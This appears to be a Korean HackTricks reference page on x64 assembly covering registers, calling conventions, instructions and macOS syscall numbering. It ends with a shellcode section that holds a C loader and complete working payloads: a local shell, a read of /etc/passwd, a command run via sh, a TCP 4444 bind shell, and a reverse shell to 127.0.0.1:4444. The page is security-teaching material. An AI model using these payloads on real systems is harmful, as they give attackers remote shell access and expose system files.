# x64 소개

{{#include ../../../banners/hacktricks-training.md}}

## **x64 소개**

x64는 x86-64라고도 하며, 주로 데스크톱 및 서버 컴퓨팅에서 사용되는 64비트 processor architecture입니다. Intel이 제작한 x86 architecture에서 시작되었으며, 이후 AMD가 AMD64라는 이름으로 채택했습니다. 현재 개인용 컴퓨터와 서버에서 널리 사용되는 architecture입니다.

### **Registers**

x64는 x86 architecture를 확장하여 `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, 그리고 `r8`부터 `r15`까지 이름이 지정된 **16개의 general-purpose registers**를 제공합니다. 각 register는 **64비트**(8바이트) 값을 저장할 수 있습니다. 또한 이 registers에는 호환성 및 특정 작업을 위한 32비트, 16비트, 8비트 sub-registers도 있습니다.

1. **`rax`** - 전통적으로 함수의 **return values**에 사용됩니다.
2. **`rbx`** - memory operations의 **base register**로 자주 사용됩니다.
3. **`rcx`** - 일반적으로 **loop counters**에 사용됩니다.
4. **`rdx`** - extended arithmetic operations를 포함한 다양한 용도로 사용됩니다.
5. **`rbp`** - stack frame의 **base pointer**입니다.
6. **`rsp`** - stack의 최상단을 추적하는 **stack pointer**입니다.
7. **`rsi`** 및 **`rdi`** - string/memory operations에서 **source** 및 **destination** indexes로 사용됩니다.
8. **`r8`**부터 **`r15`**까지 - x64에서 추가된 general-purpose registers입니다.

### **Calling Convention**

x64 calling convention은 operating system에 따라 다릅니다. 예를 들어:

- **Windows**: 처음 **네 개의 parameters**는 **`rcx`**, **`rdx`**, **`r8`**, **`r9`** registers로 전달됩니다. 이후 parameters는 stack에 push됩니다. return value는 **`rax`**에 있습니다.
- **System V (UNIX-like systems에서 일반적으로 사용됨)**: 처음 **6개의 integer 또는 pointer parameters**는 **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, **`r9`** registers로 전달됩니다. return value 역시 **`rax`**에 있습니다.

함수가 6개보다 많은 inputs를 받는 경우 **나머지는 stack을 통해 전달됩니다**. stack pointer인 **RSP**는 **16바이트 aligned** 상태여야 합니다. 이는 call이 발생하기 전에 해당 pointer가 가리키는 address가 16으로 나누어져야 함을 의미합니다. 따라서 일반적으로 function call을 수행하기 전에 shellcode에서 RSP가 올바르게 aligned되도록 해야 합니다. 그러나 실제로는 이 요구 사항이 충족되지 않아도 system calls가 작동하는 경우가 많습니다.

### Calling Convention in Swift

Swift에는 자체 **calling convention**이 있으며, [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)에서 확인할 수 있습니다.

### **Common Instructions**

x64 instructions는 풍부한 명령어 집합을 제공하며, 이전 x86 instructions와의 호환성을 유지하는 동시에 새로운 instructions도 도입했습니다.

- **`mov`**: 한 **register** 또는 **memory location**의 값을 다른 곳으로 **Move**합니다.
- Example: `mov rax, rbx` — `rbx`의 값을 `rax`로 이동합니다.
- **`push`** 및 **`pop`**: 값을 **stack**에 push하거나 stack에서 pop합니다.
- Example: `push rax` — `rax`의 값을 stack에 push합니다.
- Example: `pop rax` — stack의 최상단 값을 `rax`로 pop합니다.
- **`add`** 및 **`sub`**: **Addition** 및 **subtraction** operations입니다.
- Example: `add rax, rcx` — `rax`와 `rcx`의 값을 더하고 그 결과를 `rax`에 저장합니다.
- **`mul`** 및 **`div`**: **Multiplication** 및 **division** operations입니다. 참고: 이 instructions는 operand 사용 방식과 관련된 특정 동작을 수행합니다.
- **`call`** 및 **`ret`**: **functions를 call**하고 **return**할 때 사용됩니다.
- **`int`**: software **interrupt**를 trigger할 때 사용됩니다. 예: `int 0x80`은 32비트 x86 Linux에서 system calls에 사용되었습니다.
- **`cmp`**: 두 값을 **Compare**하고 결과에 따라 CPU의 flags를 설정합니다.
- Example: `cmp rax, rdx` — `rax`와 `rdx`를 비교합니다.
- **`je`, `jne`, `jl`, `jge`, ...**: 이전 `cmp` 또는 test의 결과에 따라 control flow를 변경하는 **Conditional jump** instructions입니다.
- Example: `cmp rax, rdx` instruction 이후 `je label` — `rax`가 `rdx`와 같으면 `label`로 jump합니다.
- **`syscall`**: 일부 x64 systems(예: modern Unix)에서 **system calls**에 사용됩니다.
- **`sysenter`**: 일부 platforms에서 최적화된 **system call** instruction입니다.

### **Function Prologue**

1. **이전 base pointer push**: `push rbp` (caller의 base pointer를 저장)
2. **현재 stack pointer를 base pointer로 이동**: `mov rbp, rsp` (현재 function을 위한 새로운 base pointer 설정)
3. **local variables를 위한 stack 공간 할당**: `sub rsp, <size>` (`<size>`는 필요한 바이트 수)

### **Function Epilogue**

1. **현재 base pointer를 stack pointer로 이동**: `mov rsp, rbp` (local variables 할당 해제)
2. **stack에서 이전 base pointer pop**: `pop rbp` (caller의 base pointer 복원)
3. **Return**: `ret` (caller에게 control을 return)

## macOS

### syscalls

syscalls에는 여러 class가 있으며, [**여기에서 확인할 수 있습니다**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
그런 다음, 각 syscall 번호는 [**이 URL에서**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)** 확인할 수 있습니다:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
따라서 **Unix/BSD class**의 `open` syscall(**5**)을 호출하려면 다음 값을 추가해야 합니다: `0x2000000`

그러므로 open을 호출할 syscall number는 `0x2000005`입니다.

### Shellcodes

컴파일하려면:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
바이트를 추출하려면:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>shellcode 테스트용 C 코드</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**여기**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)에서 가져와 설명합니다.<sup>[1]</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### cat으로 읽기

목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`를 실행하는 것이므로, 두 번째 인수(x1)는 params의 배열입니다(메모리에서는 주소가 stack에 쌓인 형태입니다).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### sh로 명령 실행
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)의 **포트 4444** Bind shell<sup>[2]</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)의 Reverse shell. **127.0.0.1:4444**로 Reverse shell 연결<sup>[3]</sup>
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## 참고 자료

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
